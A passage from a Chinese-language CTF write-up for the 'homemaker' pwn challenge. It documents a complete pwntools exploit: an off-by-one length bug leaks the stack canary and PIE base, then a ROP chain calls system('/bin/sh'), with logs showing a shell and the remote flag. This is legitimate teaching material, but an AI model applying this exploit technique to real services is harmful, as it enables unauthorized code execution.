> `state[0x108]` 就是「離 `state` 起點 0x108 bytes 的那一格」。
> 差別只有兩點：① 本題的 `state` 在 `.bss`（不是堆疊上的區域變數），但它同樣是一塊連續記憶體的起點；
> ② 下面的**索引是 payload 的索引**，而 `append` 是從 `payload+1` 開始複製，
> 所以 `payload[i]` 對應的其實是 `state[i-1]`（見下方「記法」那一行，別差一格）。

```
payload 索引       內容                        會被複製到 state 的位置
------------------------------------------------------------------------
payload[0]        = 0x02（opcode APPEND）     （不複製，它是 opcode）
payload[1..0x108] = 'B' * 0x108              state[0x000..0x107]
payload[0x109..0x110] = canary（洩漏到的）    state[0x108]  ← 金絲雀槽
payload[0x111..0x118] = saved rbp（原值）     state[0x110]  ← saved rbp
payload[0x119..0x120] = chain[0]             state[0x118]  ← 回傳位址！
payload[0x121..]      = chain[1], chain[2]…  state[0x120..] ← ROP 本體
...
payload[0x1f0..0x1f7] = "/bin/sh\0"          留在 .bss:0x4a54 當 system 的參數
payload[0x1f8..0x1ff] = 補 0                  state[0x1f7..0x1fe]（不重要）
```

> 記法：**`state[i] = payload[i+1]`**（append 從 `payload+1` 開始複製）。這是我自己踩過的坑（見 §11）。

> 💡 **`chain[0]` 在 `state[0x118]`，`state[0x120]` 是「`ret` 之後 `rsp` 的位置」**
> （`exploit.py` 的註解也是這樣寫的：`chain[0]` 蓋在被劫持的回傳位址 `state[0x118]`，
> 其餘的鏈從 `state[0x120]` 開始）。兩句話講的是不同的格子：
> * `state[0x118]` = **被蓋掉的那格回傳位址** = `chain[0]`（對齊用 `ret`）
> * `state[0x120]` = 對齊用 `ret` 執行完後 `rsp` 指到的地方 = `chain[1]`（`pop rdi; ret`）
>
> **`state[0x1ff]` 這一格**：append 多讀的那 1 個 byte 就是這個訊框自己的 CRC byte
> （實測值 `0xcd`），它來自 payload **後面**那一格、不是 payload 裡的任何 byte。
> 這裡 capacity 已經用不到了，所以填什麼都無所謂 —— 但別以為那是你能控制的 byte。

> 🧯 **`assert` 是你的安全網**：`exploit.py` 裡有 `assert len(payload) == 0x200`。
> 訊框長度錯了就讓它早點炸，不要讓程式去猜 —— 差一個 byte 的 payload 會讓 `state[i] = payload[i+1]`
> 整體位移，結果是 canary 對不上、你卻完全看不出原因。

> ❓ **為什麼把 `main` 的金絲雀蓋爛了也不會 `stack smashing detected`？**
> 因為 `main` 的收尾程式碼（`0x1aa4 mov rdx,[rbp-8]` / `0x1aa8 sub rdx,fs:0x28`）
> **根本不會被執行到**：我們的鏈是從 `service_loop` 的 `ret`（`0x1a7e`）直接跳走的，
> `service_loop` 一旦 `ret`，控制權就永遠離開 `main` 了。
> `main` 的框架、`main` 的金絲雀、`main` 的回傳位址對我們來說都只是「後面的格子」，不會被檢查也不會被用到。
>
> ⚠️ 但**`service_loop` 自己的金絲雀（`state[0x108]`）一定要原樣寫回**，
> 因為它的檢查在我們的鏈**之前**（`0x1a76`）。這兩個金絲雀是**不同的儲存格**，只是值剛好相同
> （同一個執行緒的 `fs:0x28`）。

### 7.4 訊框在網路上的樣子（第一次 APPEND）

```
1b 5b | 01 01 | 02 cd 41 41 ... 41 | ff | 1b 5c
ESC[     L=0x101  opcode  256 bytes   CRC=0xff  ESC\
```

`0x101` 的最後一個 byte 會被寫到 `state[0x100]`，而它必須是 `0xff` → 所以我們讓 CRC = 0xff。

---

## 8. `exploit.py` 逐行註解

```python
import sys, time
# from pwn import * 會吃掉多餘的命令列參數（pwnlib.args 的行為），
# 所以 REMOTE 這個參數必須在 import 之前就先讀走
WANT_REMOTE = len(sys.argv) > 1 and sys.argv[1].upper() == 'REMOTE'
from pwn import *

context.arch = 'amd64'      # 讓 pwntools 用 64-bit 規則
context.log_level = 'info'
BIN = './homemaker'
HOST, PORT = 'chal.sunshinectf.games', 26008

MAGIC     = 0x1337c35f       # validate() 接受的鑰匙卡魔數
OP_AUTH   = 1                # 鑰匙卡驗證
OP_APPEND = 2                # 有漏洞的寫入
OP_LEAK   = 3                # 洩漏 capacity bytes 的堆疊
OP_EJECT  = 4                # 離開迴圈 → main 返回 → 觸發 ROP

OFF_RET_ADDR_IN_MAIN = 0x1a9f   # 洩漏到的回傳位址（= PIE + 0x1a9f）
OFF_POP_RDI_RET      = 0x12aa   # pop rdi; ret（藏在 0x1337c35f 立即值裡）
OFF_SYSTEM_PLT       = 0x10c0   # system@plt
OFF_RET              = 0x101a   # 單獨一個 ret（.init 的結尾）
OFF_RXBUF            = 0x4864   # .bss 接收緩衝區（payload 起點）

STATE_CANARY    = 0x108      # 由 gdb 量出來的 state 內偏移
STATE_SAVED_RBP = 0x110
STATE_RETADDR   = 0x118
SH_OFF          = 0x1f0      # "/bin/sh" 放在 payload 的哪裡
```

```python
def crc8(data):                       # 對應 0x11e9 的 8-bit CRC
    acc = 0
    for b in data:
        acc ^= b
        for _ in range(8):
            acc = ((acc << 1) ^ 0x2f) & 0xff if acc & 0x80 else (acc << 1) & 0xff
    return acc

def frame(payload):                   # 打包訊框（長度是大端序！）
    return b'\x1b[' + len(payload).to_bytes(2, 'big') + payload + \
           bytes([crc8(payload)]) + b'\x1b\\'

def recv_frame(io):                   # 解析伺服器訊框
    hdr = io.recvn(4, timeout=5)
    assert hdr[:2] == b'\x1b['
    ln = u16(hdr[2:4], endian='big')  # 伺服器的長度 = status + data
    body = io.recvn(ln + 3, timeout=5)
    return body[0], body[1:1 + ln - 1]     # (status, data)

def solve_crc_byte(payload, want):    # 讓 CRC 等於想要的 byte（off-by-one 的關鍵）
    for v in range(256):
        payload[1] = v
        if crc8(bytes(payload)) == want:
            return v
    raise RuntimeError('no crc solution')
```

主流程：

```python
# 0) 吃掉橫幅（尾端有兩個 '\n'）
io.recvuntil(b'<<\n'); io.recvn(1)

# 1) AUTH：opcode 1 + magic（大端序）→ capacity = 0x100
io.send(frame(bytes([OP_AUTH]) + p32(MAGIC, endian='big')))
st, _ = recv_frame(io); assert st == 0

# 2) APPEND#1：L = 0x101 → n = 0x100 = capacity 通過檢查，但寫了 0x101 bytes，
#    最後一個 byte（= 訊框 CRC）落在 state[0x100] → capacity = 0x01ff
pl = bytearray(b'\x02' + b'A' * 0x100)
pl[1] = solve_crc_byte(pl, 0xff)
io.send(frame(bytes(pl)))
st, _ = recv_frame(io); assert st == 0

# 3) SEND STATE：洩漏 0x1ff bytes 堆疊
io.send(frame(bytes([OP_LEAK])))
st, leak = recv_frame(io)
canary    = u64(leak[0x108:0x110])     # 金絲雀
saved_rbp = u64(leak[0x110:0x118])     # saved rbp（用來判斷對齊）
ret_main  = u64(leak[0x118:0x120])     # PIE + 0x1a9f
pie       = ret_main - 0x1a9f
assert pie & 0xfff == 0                # 健全性檢查：一定 page 對齊
assert canary & 0xff == 0              # 健全性檢查：金絲雀低位必為 0

# 4) 組 ROP chain
pop_rdi = pie + 0x12aa
system  = pie + 0x10c0
binsh   = pie + 0x4864 + 0x1f0         # 我們的 "/bin/sh"（在 .bss）
ret     = pie + 0x101a
chain   = [pop_rdi, binsh, system, 0]
if (saved_rbp + 0x10) % 16 == 0:       # system 入口需要 rsp%16 == 8
    chain = [ret] + chain

# 5) APPEND#2：L = 0x200 → 寫 0x200 bytes，蓋掉 canary/rbp/ret 並鋪好 ROP
payload  = bytearray(b'\x02' + b'B' * 0x108)   # state[0..0x107]
payload += p64(canary)                          # state[0x108]
payload += p64(saved_rbp)                       # state[0x110]
payload += p64(chain[0])                        # state[0x118] ← 回傳位址（= chain[0]）
for i, w in enumerate(chain[1:]):               # state[0x120] ← 鏈本體（chain[1] 開始）
    payload += p64(w)
payload += b'\x00' * (0x1f0 - len(payload))
payload += b'/bin/sh\x00'                       # .bss:0x4a54
payload += b'\x00' * (0x200 - len(payload))     # 補滿 0x200
assert len(payload) == 0x200, len(payload)      # 安全網：長度錯了就早點炸
io.send(frame(bytes(payload)))
st, _ = recv_frame(io); assert st == 0

# 6) EJECT：離開迴圈 → 0x1865 的 leave;ret（金絲雀檢查通過）→ ROP → system("/bin/sh")
io.send(frame(bytes([OP_EJECT])))
recv_frame(io)                                  # EJECT 的 ack，接著就是 shell

# 7) 下指令、收 flag
io.send(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE\n')
out = io.recvrepeat(6)
```

`main()` 只負責：選 local / remote、呼叫 `exploit()`、從輸出裡用 `sun{...}` 抓出 flag 並印 `FLAG: ...`。

---

## 9. 實際執行結果

> ⚠️ **一定要 `cd pwn5/` 之後再跑**，因為 `exploit.py` 用的是相對路徑 `./homemaker`
> （在 repo 根目錄執行會得到 `[ERROR] './homemaker' does not exist`）。
> 或直接用 `wp/run_all.sh pwn5`（它會自動 cd 進題目目錄、並且附上正確的 port）。

```bash
cd pwn5
python3 exploit.py              # 本地
python3 exploit.py REMOTE       # 遠端 chal.sunshinectf.games:26008
```

（想開 pwntools 的除錯模式是 `python3 exploit.py DEBUG` —— 掛在**命令列參數**上，不是 `DEBUG=1` 環境變數。）

### 9.1 本機（先用假 flag 驗證）

```bash
$ echo 'sun{LOCAL_DUMMY_FLAG}' > flag.txt
$ python3 exploit.py
[+] canary    = 0x8ad694b86951ed00
[+] saved rbp = 0x7ffc52bc2560
[+] PIE base  = 0x55c8ae3eb000
[+] shell should be up, sending commands
sun{LOCAL_DUMMY_FLAG}
total 116
drwxr-xr-x  3 kzzz kzzz   4096 Sep 28 00:25 .
...
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_DUMMY_FLAG}
```

### 9.2 遠端（真實 flag）

```bash
$ python3 exploit.py REMOTE
[x] Opening connection to chal.sunshinectf.games on port 26008
[+] Opening connection to chal.sunshinectf.games on port 26008: Done
[+] canary    = 0xc6890e4ecbb41300
[+] saved rbp = 0x7fffa9c3def0
[+] PIE base  = 0x5ef6f44bf000
[+] shell should be up, sending commands
sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
total 12
drwxr-xr-x 2 root root      4096 Sep 26 00:54 .
drwxr-xr-x 1 root root      4096 Sep 26 00:55 ..
-rw-r----- 1 root homemaker   64 Sep 26 00:54 flag.txt
uid=1337(homemaker) gid=1337(homemaker) groups=1337(homemaker)
DONE

FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```

**真實 flag：`sun{the_future_is_now_today_well_wait_how_are_you_reading_this}`**
（遠端 flag 就在工作目錄的 `flag.txt`，權限 `-rw-r----- homemaker:homemaker`，而 shell 的身分就是 `homemaker`。）

---

## 10. 完整攻擊流程圖

```
① AUTH   ─ opcode1 + "13 37 c3 5f"
                 │  capacity = 0x100
                 ▼
② APPEND#1 ─ L=0x101（CRC 強制 =0xff）
                 │  寫 0x101 bytes → state[0x100] = 0xff
                 │  capacity: 0x0100 → 0x01ff   ★ off-by-one
                 ▼
③ SEND STATE ─ send_frame(0, state, 0x1ff)
                 │  洩漏 state[0..0x1fe]
                 ├─ state[0x108] = stack canary
                 ├─ state[0x110] = saved rbp（判斷 16-byte 對齊）
                 └─ state[0x118] = PIE + 0x1a9f  →  PIE_base = 值 - 0x1a9f
                 ▼
④ APPEND#2 ─ L=0x200（n=0x1ff ≤ capacity 0x1ff）
                 │  寫 0x200 bytes：
                 │  state[0x108] = canary（原樣寫回，否則 __stack_chk_fail）
                 │  state[0x110] = saved rbp（原值）
                 │  state[0x118] = ret                    ← 劫持
                 │  state[0x120] = pop rdi; ret / "/bin/sh" / system@plt
                 └  .bss:0x4a54 = "/bin/sh\0"
                 ▼
⑤ EJECT  ─ 離開迴圈 → 0x1865 epilogue 金絲雀檢查通過 → leave; ret
                 ▼
            ROP: ret（對齊）→ pop rdi; ret → "/bin/sh" → system@plt
                 ▼
              /bin/sh（繼承 socket 的 stdin/stdout）
                 ▼
            cat flag.txt → sun{...}
```

---

## 11. 常見坑（血淚清單）

1. **`process()` 的 stdout 預設是 PTY（不是 pipe），但 stdin 預設是 pipe**：
   pwntools 的 `process('./homemaker')` 等於 `stdin=PIPE, stdout=PTY, stderr=STDOUT, raw=True`。
   因為 `raw=True`，PTY 會被設成 **raw mode**（不是 canonical），所以二進位訊框其實送得進去、
   這題用預設值也能跑成功（實測過，`python3 -c` 跑 `process('./homemaker')` 一樣拿得到 flag）。
   我們在 `exploit.py` 明寫 `process(BIN, stdin=process.PIPE, stdout=process.PIPE)` 只是為了：
   * 讓 stdout 也走 pipe（輸出不會被 PTY 的終端機行為影響，`recvuntil`/`recvrepeat` 更可預期）；
   * 讓本機與遠端（本來就是 socket）的行為一致，少一個變數。
   **真正會卡住的情況是**：你在 shell 裡手動 `./homemaker` 然後想用管線餵二進位訊框，
   或用了 `stdin=process.PTY` 又沒關 canonical mode——那時才需要處理「要按 Enter」的問題。
   （除錯小技巧：`ls -l /proc/<pid>/fd/0` 看 stdin 到底是 pipe 還是 `/dev/pts/N`。
   本題實測 `fd0 -> pipe:[…]`、`fd1 -> /dev/pts/0`。）
2. **`from pwn import *` 會吃掉命令列參數**：`python3 exploit.py REMOTE` 之後 `sys.argv[1]` 就不見了
   （`pwnlib.args` 會把不認識的參數吃掉）→ **必須在 import 之前先讀 `sys.argv`**。
3. **長度欄位是大端序，而 pwntools `p16()` 是小端序**：
   我用 `p16(len)` 送過 `1b 5b 05 00 …`，伺服器解讀成 `L = 0x0500`，
   而 `0x0500 + 7 = 0x507 <= 0x800` **通過了長度檢查** → 它開始等 1283 bytes，整個卡死（連錯誤訊息都沒有）。
   **解法：`len(payload).to_bytes(2, 'big')`。**
   （除錯技巧：`cat /proc/<pid>/syscall` 看它 `read(0, 0x...486c, 0x4fb)` 就能確認是讀長度問題。）
4. **`state[i] = payload[i+1]`**：append 從 `payload+1` 開始複製，所以自己排 payload 時**容易整體差一格**，
   結果金絲雀沒對上 → `*** stack smashing detected ***`（SIGABRT）。
   建議：先用紙畫表（見 §7.3）或用 gdb 在 epilogue 檢查 `[rbp-8]`。
5. **金絲雀必須「完整 8 bytes」寫回**：不要只補低位；且不要假設它是 0x00 結尾就偷懶。
6. **16-byte 對齊**：`system`／libc 有些函式用 `movaps`，`rsp % 16 != 8` 就 SIGSEGV。
   記得在 chain 前面補一個 `ret`（本題用洩漏到的 `saved_rbp` 動態判斷，最穩）。
7. **`/bin/sh` 要有 NUL 結尾**，而且位址要指向**可讀且沒被覆蓋**的地方。
   我們放在 `.bss:0x4a54`，之後只再送一個 7-byte 的 EJECT 訊框（只覆寫 `0x4860..0x4867`），所以安全。
8. **Full RELRO → 別浪費時間想 GOT 覆寫**；也別想改 `.fini_array`（同樣被 RELRO 保護成唯讀）。
9. **PIE 低位址**：`PIE_base` 一定是 0x1000 對齊；算出來不是整頁對齊就表示 offset 抄錯了。
10. **frame 長度上限**：`L + 7 <= 0x800` → `L ≤ 0x7f9`；想送更長的 payload 是行不通的（本題也用不到）。
11. **遠端/本地 libc 差異**：本機 Arch glibc **2.44**、遠端 Ubuntu 22.04 glibc **2.35**，
    `system`、`pop rdi`、`"/bin/sh"` 的位移都不同 → **本題刻意只用 PIE 內部的 gadget 與自己寫的字串**，
    完全不碰 libc，所以兩邊都能打（這是很值得學的「libc-free ROP」技巧）。
12. **shell 結束後程式會 SIGSEGV**：chain 最後我們放 `0` 當 `system` 的回傳位址，
    shell `exit` 之後就會崩潰 —— **這不影響拿 flag**（flag 已經印出來了）。要更優雅可以接 `exit@plt`，但本題沒有 import `exit`。
13. **CRC 求解**：off-by-one 寫進去的 byte 正好是訊框 CRC，不可自由選擇 → 要「反解」讓 CRC = 0xff。
    本題用暴力枚舉 1 byte 即可（256 次），因為 CRC 對單一 byte 是雙射。
14. **在錯的目錄執行**：`exploit.py` 用相對路徑 `./homemaker`，所以一定要 `cd pwn5` 之後再跑
    （在 repo 根目錄跑會看到 `[ERROR] './homemaker' does not exist`）；或用 `wp/run_all.sh pwn5`。

---

## 12. 附錄：檔案與指令速查

| 檔案 | 說明 |
|---|---|
| `exploit.py` | 最終 exploit：`python3 exploit.py`（本機）／`python3 exploit.py REMOTE`（遠端） |
| `FLAG.txt` | 真實遠端 flag |
| `notes.md` | 本文件 |
| `NOTES_SUMMARY.txt` | 給上層 agent 的 30 行內摘要 |
| `disasm.txt` | `objdump -d -M intel --section=.text homemaker` 完整輸出 |
| `gdb_evidence.sh` / `gdb_evidence_raw.txt` | 產生本文件 §5.3 證據的 gdb 腳本與原始輸出 |
| `gdb_evidence.py` / `exploit_input.bin` | 用 ASLR 關閉產生「固定位址」的輸入流，供 gdb 重播 |
| `remote_run.txt` | 遠端成功輸出的原始紀錄 |
| `scratch_leak.py` | 只做 leak 的最小範例（教學用） |
| `flag.txt` | 本機測試用的假 flag |

常用指令：

```bash
# 保護機制
pwn checksec ./homemaker
# 反組譯
objdump -d -M intel --section=.text ./homemaker
# 找 gadget
ROPgadget --binary ./homemaker | grep -E 'pop rdi|: ret$'
# 關掉 ASLR 跑（方便對位址）
setarch -R python3 exploit.py
# 重現 gdb 證據
./gdb_evidence.sh
# 手動 gdb（PIE base = 0x555555554000）
gdb -q ./homemaker -ex 'b *0x555555554000+0x1a76' -ex 'run' \
    -ex 'info registers rbp rsp' -ex 'x/8gx $rbp-8'
```

---

### 一句話總結

> `APPEND` 的 off-by-one 把 16-bit 的 `capacity` 從 `0x100` 撐成 `0x1ff`，
> 於是 `SEND STATE` 意外洩漏了 canary / saved rbp / 回傳位址（拿到 PIE base），
> 再用第二次 `APPEND` 把金絲雀原樣寫回、蓋掉回傳位址，
> 用 `pop rdi; ret`（藏在魔數 `0x1337c35f` 裡）＋ `system@plt` ＋ 自己放在 `.bss` 的 `"/bin/sh"` 拿到 shell。
